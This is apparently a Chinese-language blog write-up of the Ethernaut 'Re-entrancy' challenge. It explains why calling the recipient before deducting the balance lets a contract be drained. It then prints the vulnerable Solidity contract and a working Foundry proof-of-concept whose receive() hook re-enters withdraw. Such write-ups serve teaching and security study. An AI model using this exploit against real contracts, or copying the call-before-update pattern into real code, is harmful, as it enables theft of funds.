---
title: "Re-entrancy"
date: 2026-07-20
draft: false
description: "利用重入漏洞提取合约余额"
tags:
  - Ethernaut
  - 重入
categories:
  - Ethernaut
series:
  - Ethernaut 闯关记录
---

## Re-entrancy

### 目标：

成功获得合约中的所有资产

### 思路：

这道题涉及的知识点为重入攻击，观察合约的提款函数，正常提款逻辑应该是先扣除金额，再给对方赚钱。但是这个合约是先给对方转钱再扣除金额，但是对方收到钱之后会自动触发`receive`函数，先执行`receive`函数的逻辑，如果`receive `中的逻辑可以再次运行提款函数，源代码来不及扣除取款金额就会再次提款，这样就可以出现多次重复取款，在我的攻击合约中，必须先往合约里转钱，满足` if (balances[msg.sender] >= _amount)`才能提款，**注意**：转钱的地址应该为我的攻击合约，而不能直接写`msg.sender`，因为攻击合约是通过脚本调用的，`msg.sender`代表的应该是我的钱包地址，因此取款时写的地址应该为`address(this)`，代表`Middle`合约的地址。

### 源码：

```
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;

import "openzeppelin-contracts-06/math/SafeMath.sol";

contract Reentrance {
    using SafeMath for uint256;

    mapping(address => uint256) public balances;

    function donate(address _to) public payable {
        balances[_to] = balances[_to].add(msg.value);
    }

    function balanceOf(address _who) public view returns (uint256 balance) {
        return balances[_who];
    }

    function withdraw(uint256 _amount) public {
        if (balances[msg.sender] >= _amount) {
            (bool result,) = msg.sender.call{value: _amount}("");
            if (result) {
                _amount;
            }
            balances[msg.sender] -= _amount;
        }
    }

    receive() external payable {}
}
```

### poc：

```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.15;

import "forge-std/Script.sol";
interface IEntrancy{
    function withdraw(uint256 _amount) external;
    function donate(address _to) external payable;
}

contract Middle{
    IEntrancy entrancy = IEntrancy(0x1520E118956021B1c0C7f46c8E9D90aaE3DeC193);

    function setup() external payable{
        entrancy.donate{value: 0.001 ether}(address(this));
        entrancy.withdraw(0.001 ether);
    }
    receive() external payable{
        entrancy.withdraw(0.001 ether);
    }
}

contract Attack is Script{
    function run() external{
        vm.startBroadcast();

        Middle middle = new Middle();
        middle.setup{value: 0.001 ether}();

        vm.stopBroadcast();
    }
}
```
